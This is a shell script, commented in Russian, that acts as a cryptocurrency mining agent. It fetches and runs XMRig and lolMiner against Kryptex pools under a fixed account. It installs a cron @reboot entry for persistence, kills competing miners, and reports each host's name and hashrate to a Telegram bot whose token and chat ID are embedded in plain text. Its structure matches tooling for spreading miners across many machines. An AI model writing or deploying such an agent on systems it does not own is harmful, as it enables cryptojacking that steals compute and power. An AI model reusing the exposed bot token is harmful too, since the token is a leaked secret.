#!/bin/sh
set -eu

#################################################
# MINING AGENT v2 — CPU (XMRig) + GPU (lolMiner)
# TELEMETRY → TELEGRAM (каждые 10 мин + события)
#################################################

# Разрешение майнинга (должно быть передано извне)
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

HOST="$(hostname)"
INTERVAL=30               # проверка watchdog, сек
REPORT_INTERVAL=600       # отчёт в Telegram, сек (10 мин)
MAX_RESTARTS=5            # макс перезапусков за час
RESTART_WINDOW=3600       # окно сброса счётчика (сек)

# ===== АККАУНТЫ =====
KRIPTEX="krxX3PVQVR"

# ===== ПУЛЫ =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== НОВЫЙ ТЕЛЕГРАМ (ваш токен и чат) =====
TG_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
TG_CHAT="5336452267"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

tg() {
    local text="$1"
    curl -s --connect-timeout 10 --max-time 15 \
        -X POST "$TG_API" \
        -d chat_id="$TG_CHAT" \
        --data-urlencode text="$text" \
        >/dev/null 2>&1 || true
}

# Форматирование сообщения с Markdown
tg_md() {
    local text="$1"
    curl -s --connect-timeout 10 --max-time 15 \
        -X POST "$TG_API" \
        -d chat_id="$TG_CHAT" \
        -d parse_mode="Markdown" \
        --data-urlencode text="$text" \
        >/dev/null 2>&1 || true
}

# ===== ПУТИ =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"
mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1

# ===== ПРОВЕРКА ЗАВИСИМОСТЕЙ =====
check_deps() {
    for cmd in wget curl tar; do
        if ! command -v $cmd >/dev/null 2>&1; then
            tg "⚠️ [$HOST] Отсутствует $cmd, пробую установить..."
            if command -v apt >/dev/null 2>&1; then
                apt update && apt install -y $cmd
            elif command -v yum >/dev/null 2>&1; then
                yum install -y $cmd
            else
                tg "❌ [$HOST] Не могу установить $cmd. Майнинг невозможен."
                exit 1
            fi
        fi
    done
}

# ===== ОПРЕДЕЛЕНИЕ АРХИТЕКТУРЫ =====
ARCH="$(uname -m)"
case "$ARCH" in
    x86_64)  XMRIG_URLS="https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz" ;;
    aarch64) XMRIG_URLS="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-arm64.tar.gz" ;;
    *)       tg "❌ [$HOST] Неподдерживаемая архитектура: $ARCH"; exit 1 ;;
esac

LOL_URLS="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ===== УСТАНОВКА С ПОВТОРАМИ =====
download_verify() {
    local url="$1"
    local output="$2"
    for i in 1 2 3; do
        wget -q --timeout=30 --tries=2 "$url" -O "$output" && return 0
        sleep 5
    done
    return 1
}

install_xmrig() {
    tg "📦 [$HOST] Установка XMRig"
    pkill xmrig 2>/dev/null || true
    rm -f "$BIN/cpu/xmrig"

    for URL in $XMRIG_URLS; do
        TMP="/tmp/xmrig_$$.tar.gz"
        if download_verify "$URL" "$TMP"; then
            tar -xzf "$TMP" -C "$BIN/cpu" --strip-components=1 2>/dev/null && \
            chmod +x "$BIN/cpu/xmrig" && \
            [ -x "$BIN/cpu/xmrig" ] && {
                rm -f "$TMP"
                tg_md "✅ *[$HOST]* XMRig установлен"
                return 0
            }
        fi
        rm -f "$TMP"
    done
    tg_md "❌ *[$HOST]* XMRig НЕ УСТАНОВЛЕН (сетевые ошибки)"
    return 1
}

install_lolminer() {
    tg "📦 [$HOST] Установка lolMiner"
    pkill lolMiner 2>/dev/null || true
    rm -f "$BIN/gpu/lolMiner"

    for URL in $LOL_URLS; do
        TMP="/tmp/lolminer_$$.tar.gz"
        if download_verify "$URL" "$TMP"; then
            tar -xzf "$TMP" -C "$BIN/gpu" --strip-components=1 2>/dev/null && \
            chmod +x "$BIN/gpu/lolMiner" && \
            [ -x "$BIN/gpu/lolMiner" ] && {
                rm -f "$TMP"
                tg_md "✅ *[$HOST]* lolMiner установлен"
                return 0
            }
        fi
        rm -f "$TMP"
    done
    tg_md "❌ *[$HOST]* lolMiner НЕ УСТАНОВЛЕН"
    return 1
}

# ===== ЗАПУСК С ЛОГИРОВАНИЕМ =====
start_cpu() {
    pkill xmrig 2>/dev/null || true
    "$BIN/cpu/xmrig" \
        -o "$XMR_POOL" \
        -u "$KRIPTEX.$HOST" -p x \
        --http-enabled --http-host 127.0.0.1 --http-port 16000 \
        >> "$LOG/cpu.log" 2>&1 &
    echo $! > "$RUN/cpu.pid"
    tg_md "🖥️ *[$HOST]* CPU майнер запущен (PID: $!)"
}

start_gpu() {
    pkill lolMiner 2>/dev/null || true
    "$BIN/gpu/lolMiner" \
        --algo ETCHASH \
        --pool "$ETC_POOL" \
        --user "$KRIPTEX.$HOST" \
        --ethstratum ETCPROXY \
        --apihost 127.0.0.1 --apiport 8080 \
        >> "$LOG/gpu.log" 2>&1 &
    echo $! > "$RUN/gpu.pid"
    tg_md "🎮 *[$HOST]* GPU майнер запущен (PID: $!)"
}

# ===== ПОЛУЧЕНИЕ ХЭШРЕЙТА С ПОВТОРАМИ =====
get_cpu_hr() {
    for i in 1 2 3 4 5; do
        sleep 2
        HR=$(curl -s --max-time 3 "http://127.0.0.1:16000/1/summary" 2>/dev/null | \
             grep -oE '"total":\[[0-9]+' | grep -oE '[0-9]+' | head -1)
        [ -n "$HR" ] && [ "$HR" -gt 0 ] && echo "$HR" && return 0
    done
    echo "0"
}

get_gpu_hr() {
    for i in 1 2 3 4 5; do
        sleep 2
        HR=$(curl -s --max-time 3 "http://127.0.0.1:8080/summary" 2>/dev/null | \
             grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' | grep -oE '[0-9]+(\.[0-9]+)?' | head -1)
        [ -n "$HR" ] && [ "$(echo "$HR > 0" | bc)" -eq 1 ] && echo "$HR" && return 0
    done
    echo "0"
}

# ===== ПРОВЕРКА ЖИВОСТИ ПРОЦЕССА =====
is_alive() {
    local pidfile="$1"
    [ -f "$pidfile" ] || return 1
    pid=$(cat "$pidfile" 2>/dev/null) && [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null
}

# ===== АВТОЗАПУСК =====
ensure_autostart() {
    crontab -l 2>/dev/null | grep -q "min1.sh" && return
    (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min1.sh") | crontab -
}

# ===== ГЛАВНЫЙ ЦИКЛ С ОТЧЁТАМИ =====
CPU_OK=0
GPU_OK=0
CPU_RESTARTS=0
GPU_RESTARTS=0
LAST_RESET=$(date +%s)
LAST_REPORT=$(date +%s)

check_deps
install_xmrig && CPU_OK=1
install_lolminer && GPU_OK=1
ensure_autostart

[ "$CPU_OK" = "1" ] && start_cpu   || tg_md "❌ *[$HOST]* CPU майнинг не запущен (ошибка установки)"
[ "$GPU_OK" = "1" ] && start_gpu   || tg_md "❌ *[$HOST]* GPU майнинг не запущен (нет драйверов или ошибка)"

# Отправляем сводку о старте
if [ "$CPU_OK" = "1" ] || [ "$GPU_OK" = "1" ]; then
    tg_md "✅ *[$HOST]* Майнинг инициализирован\nCPU: $([ $CPU_OK -eq 1 ] && echo '✅' || echo '❌')\nGPU: $([ $GPU_OK -eq 1 ] && echo '✅' || echo '❌')"
else
    tg_md "💀 *[$HOST]* Полный провал — ни один майнер не установлен"
    exit 1
fi

# Цикл мониторинга
while true; do
    NOW=$(date +%s)
    # Сброс счётчиков рестартов каждый час
    if [ $((NOW - LAST_RESET)) -ge $RESTART_WINDOW ]; then
        CPU_RESTARTS=0
        GPU_RESTARTS=0
        LAST_RESET=$NOW
    fi

    # CPU watchdog
    if [ "$CPU_OK" = "1" ]; then
        if ! is_alive "$RUN/cpu.pid"; then
            if [ $CPU_RESTARTS -lt $MAX_RESTARTS ]; then
                tg_md "⚠️ *[$HOST]* CPU мёртв, перезапуск ($((CPU_RESTARTS+1))/$MAX_RESTARTS)"
                start_cpu
                CPU_RESTARTS=$((CPU_RESTARTS+1))
            else
                tg_md "🔥 *[$HOST]* Слишком много перезапусков CPU — отключаю до следующего часа"
                CPU_OK=2   # помечаем как отключённый на время
            fi
        fi
    fi

    # GPU watchdog
    if [ "$GPU_OK" = "1" ]; then
        if ! is_alive "$RUN/gpu.pid"; then
            if [ $GPU_RESTARTS -lt $MAX_RESTARTS ]; then
                tg_md "⚠️ *[$HOST]* GPU мёртв, перезапуск ($((GPU_RESTARTS+1))/$MAX_RESTARTS)"
                start_gpu
                GPU_RESTARTS=$((GPU_RESTARTS+1))
            else
                tg_md "🔥 *[$HOST]* Слишком много перезапусков GPU — отключаю до следующего часа"
                GPU_OK=2
            fi
        fi
    fi

    # Регулярный отчёт о хэшрейте (раз в REPORT_INTERVAL)
    if [ $((NOW - LAST_REPORT)) -ge $REPORT_INTERVAL ]; then
        CPU_HR="0"
        GPU_HR="0"
        [ "$CPU_OK" = "1" ] && CPU_HR=$(get_cpu_hr)
        [ "$GPU_OK" = "1" ] && GPU_HR=$(get_gpu_hr)
        MSG="📊 *Отчёт от $HOST*\n🕒 $(date '+%Y-%m-%d %H:%M:%S')\n"
        [ "$CPU_OK" = "1" ] && MSG="${MSG}🖥️ CPU: \`${CPU_HR} H/s\`\n" || MSG="${MSG}🖥️ CPU: выключен\n"
        [ "$GPU_OK" = "1" ] && MSG="${MSG}🎮 GPU: \`${GPU_HR} H/s\` (ETCHASH)" || MSG="${MSG}🎮 GPU: выключен"
        tg_md "$MSG"
        LAST_REPORT=$NOW
    fi

    sleep "$INTERVAL"
done
